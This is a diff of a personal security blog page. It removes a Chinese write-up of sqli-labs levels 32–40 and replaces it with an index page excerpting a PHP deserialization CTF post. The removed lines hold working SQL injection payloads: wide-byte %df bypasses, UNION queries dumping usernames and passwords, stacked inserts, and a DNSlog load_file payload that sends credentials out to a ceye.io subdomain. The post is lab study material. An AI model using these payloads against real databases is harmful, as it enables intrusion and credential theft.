@@ -6,19 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>less32-40 | Welcome to my blogs!</title>
+  <title>Welcome to my blogs!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="less-32（宽字节注入）">
-<meta property="og:type" content="article">
-<meta property="og:title" content="less32-40">
-<meta property="og:url" content="http://yoursite.com/2020/10/25/less32-40/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Welcome to my blogs!">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="Welcome to my blogs!">
-<meta property="og:description" content="less-32（宽字节注入）">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-10-25T12:50:11.076Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="less32-40">
-<meta name="twitter:description" content="less-32（宽字节注入）">
+<meta name="twitter:title" content="Welcome to my blogs!">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to my blogs!" type="application/atom+xml">
   
@@ -154,244 +150,78 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-less32-40" class="article article-type-post " itemscope itemprop="blogPost">
+            
+  
+    <article id="post-faxulie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 class="article-title" itemprop="name">
-      less32-40
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/08/faxulie/">web-反序列</a>
     </h1>
   
 
         
-        <a href="/2020/10/25/less32-40/" class="archive-article-date">
-  	<time datetime="2020-10-25T12:37:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-25</time>
+        <a href="/2019/09/08/faxulie/" class="archive-article-date">
+  	<time datetime="2019-09-08T08:56:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3>less-32（宽字节注入）</h3>
-<a id="more"></a>
-<p>
-查看源码
-if(isset($_GET['id']))
-$id=check_addslashes($_GET['id']);
-
-</p><h1 id="在’-“-等敏感字符前面添加反斜杠"><a href="#在’-“-等敏感字符前面添加反斜杠" class="headerlink" title="在’ “ \ 等敏感字符前面添加反斜杠"></a>在’ “ \ 等敏感字符前面添加反斜杠</h1><p>function check_addslashes($string)<br>{        # \ 转换为 \<br>    $string = preg_replace(‘/‘. preg_quote(‘\‘) .’/‘, “\\\“, $string);          将       # 将 ‘ 转为&quot;<br>    $string = preg_replace(‘/&#39;/i’, ‘\&#39;‘, $string);<br>      # 将 “ 转为&quot;<br>    $string = preg_replace(‘/&quot;/‘, “\&quot;“, $string);<br>    return $string;</p>
-<p>}</p>
-<p>用%df 吃掉 源码里的\，<br>payload：<br>?id=-1%df’ union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)–+</p>
-<p></p>
-
-<h3>less-33</h3>
-<p>
-也是和less-32一样</p>
-
-<h3>less-34</h3>
-<p>
-POST型的注入,转义方式和less-33一样
-
-</p><p>将UTF-8转换为UTF-16或者UTF-32,例如将’转换为utf-16为： �’。我们可以利用这一点注入。</p>
-<p>使用�’ or 1=1#</p>
-<p></p>
-
-<h3>less-35</h3>
-<p>
-有点简单
-payload
-?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ 
-</p>
-
-<h3>less-36</h3>
-<p>
-用之前的方法依旧可行
-payload
-?id=-1%df' union select 1,2,database() --+
-或者
-
-</p><p>Payload<br>?id=-1�’ union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) –+ </p>
-<p></p>
-
-<h3>less-37</h3>
-<p>
-与less-36一样
-</p>
-
-<h4>在进入less-38前对一些知识了解<h4>
-
-<p>什么是UNC路径？</p><p>
-</p><p>
-U/C路径就是类似\\softer这样的形式的网络路径
-</p>
-
-<p>bnslog参考链接：</p>
-<a href="http://dnslog.cn/" target="_blank" rel="noopener">
-http://dnslog.cn/</a>
-<a href="http://ceye.io" target="_blank" rel="noopener">
-http://ceye.io</a>
-<p>
-（头疼）
-DNSlog注入产生
-测试一些网站的时候，一些注入都是无回显的，可以通过写脚本来进行盲注，但有些网站会ban掉我们的ip，
-可以通过设置ip代理池解决，但是盲注往往效率很低，所以产生了DNSlog注入。
-
-</p><p>DNSlog注入应用场景<br>sql注入的盲注、无回显的命令执行、无回显的SSRF</p>
-<p>DNSlog注入原理<br>有一个可以配置的域名(比如：ceye.io)，然后通过代理商设置域名(ceye.io)的 nameserver 为自己的服务器 A，<br>然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，</p>
-<p>DNSlog需要条件：<br>MySQL 开启 load_file()<br>DNSLog 平台 （Hyuga、CEYE）<br>Windows 平台</p>
-<p>dnslog payload(我失败了)：<br>?id=1’;select load_file(concat(‘\\‘,(select hex(concat_ws(‘~’,username,password)) from users limit 0,1),’.gvc791.ceye.io\abc’))–+</p>
-<p></p>
-<p>然后在：</p><a href="http://www.soolco.com/post/68806_1_1.html" target="_blank" rel="noopener">http://www.soolco.com/post/68806_1_1.html</a>
-<br>
-          <a href="https://codingnote.cc/zh-tw/p/113368/" target="_blank" rel="noopener">https://codingnote.cc/zh-tw/p/113368/</a>
-<p>解释的很好（对我个人来说）</p>
-<p>
-堆叠注入
-MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，
-如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。
-如：select * from users where id = 1;select version();
-
-</p><p>局限性<br>1、并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。<br>2、在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</p>
-<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，<br>我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
-<p></p>
-<h3>less-38</h3>
-
-<p>
-以前的源码
-$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
-$result=mysql_query($sql);
-
-</p><p>变成了现在的：<br>Php<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>if (mysqli_multi_query($con1, $sql))</p>
-<p>mysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。<br>这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。<br>因为执行sql语句时使用了mysqli_multi_query()函数，才使我们能够使用堆叠查询。</p>
-<p>union<br>?id=-1’ union select 1,version(),database() –+</p>
-<p>堆叠<br>?id=1’;insert into users(username,password) values (‘hello’,’world’);<br>添加字段值<br>insert into users(username,password) values (‘hello’,’world’);<br>这个倒是看明白了，但是 国光的其它注入倒是不怎么明白</p>
-<p>噢。第一条语句才是会回显的第二条是不回显的</p>
-<p></p>
-
-<h3>less-39</h3>
-<p>
-与less-38一样
-</p>
-
-
-<h3>less-40</h3>
-<p>
-用万能语句套进去
-payload
-?id=1') and 1=2 union select 1,2,database() --+
-</p>
-</h4></h4>
+        <p>题目：</p>
+<p><img src="/image/web1.png" alt></p>
+<p>wakeup()函数用法<br><strong>wakeup()是用在反序列化操作中。unserialize()会检查存在一个</strong>wakeup()方法。如果存在，则先会调用__wakeup()方法。</p>
+<p>测试结果：<br><img src="/image/2.png" alt><br>序列化后为O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
+<p>O代表结构类型为：类:4表示类名长度:接着是类名:属性（成员）个数<br>大括号内分别是：属性名类型;长度:名称:值类型:长度:值</p>
+        
+          <a class="article-more-a" href="/2019/09/08/faxulie/#more">more >></a>
+        
       
 
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>十分感谢<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
       
     </div>
     <div class="article-info article-info-index">
       
       
-      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">-web -反序列</a>
+        		</li>
+      		
+		</ul>
+	</div>
 
       
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/WEB//" class="article-tag-list-link color4">WEB</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
       
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
-        </div>
-      </div>
-    </span>
-  </div>
-</div>
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/08/faxulie/">展开全文 >></a>
+        </p>
+      
 
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/10/25/less32-40/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2020/10/31/记一次ssrf漏洞gopher对mysql的攻击/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          记一次ssrf漏洞gopher对mysql的攻击
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2020/10/25/less20-31/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">less20-31</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -411,14 +241,12 @@ payload
 
 
 
-  
-  
-  
 
   
-
   
-
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    </nav>
   
 
 
@@ -449,8 +277,8 @@ payload
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: false,
-		isPost: true,
+		isHome: true,
+		isPost: false,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
